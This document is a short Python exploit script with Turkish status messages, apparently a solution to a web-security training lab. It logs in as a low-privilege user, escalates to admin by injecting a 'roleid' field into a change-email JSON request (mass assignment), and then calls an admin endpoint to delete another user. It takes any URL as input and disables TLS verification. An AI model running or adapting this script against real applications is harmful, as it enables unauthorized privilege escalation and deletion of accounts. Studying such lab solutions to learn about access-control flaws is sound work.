import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }

def delete_user(s, url):
    login_url = url + "/login"
    data = {"username": "wiener",
            "password": "peter"}
    
    r = s.post(login_url, data= data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res : 
        print("[+] Giriş okey")


        change_email_url = url +"/my-account/change-email"
        data_role_change = {"email": "test@test.co", "roleid": 2}
        r  = s.post(change_email_url, json= data_role_change, verify=False, proxies=proxies)
        res = r.text
        if "Admin" in res:
             print("[+] Admin Giriş okey")
             delete_carlos_url = url + '/admin/delete?username=carlos'
             r = s.get(delete_carlos_url, verify=False, proxies=proxies )
             if r.status_code==200:
                print("[+] Carlos Delete Completed")
             else:
                 print("[-] Carlos Delete Error")
                 sys.exit(-1)
        else:
             print("[+] Admin Giriş okey değil")
             sys.exit(-1)


    
    else:
        print("[+] Giriş yok")
        sys.exit(-1)


if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
    url = sys.argv[1]
    s = requests.Session()
    print("[+] Admin panel arıyorum.......")
    delete_user(s, url)


